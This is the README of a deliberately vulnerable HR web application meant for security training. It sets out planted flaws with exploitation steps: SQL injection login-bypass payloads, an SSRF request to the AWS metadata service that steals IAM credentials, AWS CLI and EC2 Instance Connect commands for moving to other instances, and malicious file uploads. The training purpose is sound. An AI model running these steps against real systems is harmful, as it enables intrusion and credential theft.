
# HR Cyber Security Lab Simulator

This project is a deliberately vulnerable HR application designed for cybersecurity training and education. It demonstrates common security vulnerabilities found in web applications.

⚠️ **WARNING: This application is intentionally vulnerable and should NEVER be deployed in a production environment or with real data.** ⚠️

## Application Overview

This HR application simulates a typical enterprise human resources system with the following features:

- User authentication and management
- Employee profile management with sensitive personal data
- Document upload and management
- Leave request system
- Organization hierarchy visualization
- Role-based access control (employee, manager, HR)
- New employee onboarding wizard
- PDF generation of employee data

## Security Vulnerabilities

This application has been deliberately designed with the following vulnerabilities:

### 1. SQL Injection (SQLi)

The login functionality is vulnerable to SQL injection:

```javascript
// Example vulnerable code
console.log(`SELECT * FROM users WHERE username='${username}' AND password='${password}'`);
```

**Exploitation Example:**
- Enter `' OR '1'='1` as the username and anything as the password
- This would result in the SQL query: `SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything'`
- Since `'1'='1'` is always true, this would bypass authentication
- Alternatively, you can use: `admin'--` as the username, which comments out the password check entirely

### 2. Server-Side Request Forgery (SSRF)

The file upload system is vulnerable to SSRF:

```javascript
// Example vulnerable endpoint
console.log(`/api/upload?url=s3://employee-bucket/${currentUser?.id}/${file.name}`);
```

**Exploitation Example:**
- Intercept the upload request with a proxy tool like Burp Suite
- Modify the URL parameter to point to internal resources: `/api/upload?url=http://169.254.169.254/latest/meta-data/`
- This could potentially allow access to AWS metadata service or other internal systems

#### Exploiting SSRF to Connect to Other EC2 Instances

After exploiting the SSRF vulnerability, you can use the EC2 instance's IAM role to connect to other EC2 instances:

1. **Access the EC2 Instance Metadata Service**:
   ```
   /api/upload?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/hr-portal-ec2-role
   ```
   This will return temporary AWS credentials (access key, secret key, token).

2. **Use AWS CLI with the stolen credentials**:
   ```bash
   export AWS_ACCESS_KEY_ID=ASIA...
   export AWS_SECRET_ACCESS_KEY=stolen_secret_key
   export AWS_SESSION_TOKEN=stolen_session_token
   ```

3. **List other EC2 instances**:
   ```bash
   aws ec2 describe-instances --region us-east-1
   ```

4. **Connect to another instance using EC2 Instance Connect**:
   ```bash
   # Generate a temporary SSH key
   ssh-keygen -t rsa -f /tmp/temp_key -N ""
   
   # Push the public key to the target EC2 instance
   aws ec2-instance-connect send-ssh-public-key \
     --region us-east-1 \
     --instance-id i-target-instance-id \
     --availability-zone target-az \
     --instance-os-user ec2-user \
     --ssh-public-key file:///tmp/temp_key.pub
   
   # Connect using the private key
   ssh -i /tmp/temp_key ec2-user@target-instance-ip
   ```

This attack works because the EC2 instance has been granted IAM permissions to connect to other instances without requiring additional credentials.

### 3. Insecure File Upload

The application allows unrestricted file uploads:

```javascript
// No validation on file uploads
const handleFileUpload = (e) => {
  const file = e.target.files[0];
  if (file) {
    // No validation for file type, size, or content
    console.log(`Uploading file: ${file.name} without any validation`);
  }
};
```

**Exploitation Examples:**
- Upload malicious PHP files that could be executed by the server
- Upload extremely large files to cause denial of service
- Upload files with embedded malicious scripts

### 4. Sensitive Data Exposure

The application displays and processes sensitive information without proper protection:

- Social Security Numbers
- Bank account details
- Salary information
- Personal identifying information

### 5. Insecure Infrastructure Configuration

The application is designed to be deployed with:
- Hardcoded credentials in YAML files for RDS access
- Insecure S3 bucket configurations
- Unprotected EC2 instances
- Exposed secrets in GitHub Actions configuration

## Authentication Information

For testing purposes, you can use the following credentials:

- Regular Employee: Username `john`, any password (or SQL injection)
- Manager: Username `jane`, any password (or SQL injection)
- HR Admin: Username `admin`, any password (or SQL injection)

To register a new account, use company code: `WelcomeAboard`

## Deployment Architecture (Security Training)

For training purposes, the application is designed to be deployed as:

1. A microservices application using API Gateway
2. Single EC2 instance (not ECS)
3. RDS database with credentials in YAML file
4. S3 bucket for static file storage
5. Deployment using GitHub Actions with Terraform

## How to Use for Training

This application can be used to:
1. Practice identifying security vulnerabilities through code review
2. Demonstrate exploitation of common web application vulnerabilities
3. Train security teams on proper remediation techniques
4. Practice secure DevOps and infrastructure as code

## Recommended Security Controls (for discussion)

After exploring the vulnerabilities, discuss how to implement proper security controls:

- Parameterized queries for database access
- Input validation and sanitization
- Proper authentication and authorization
- Secure file upload handling
- Encryption of sensitive data
- Secure infrastructure configuration
- Secret management
- Network security controls

## License

This project is intended for educational purposes only.
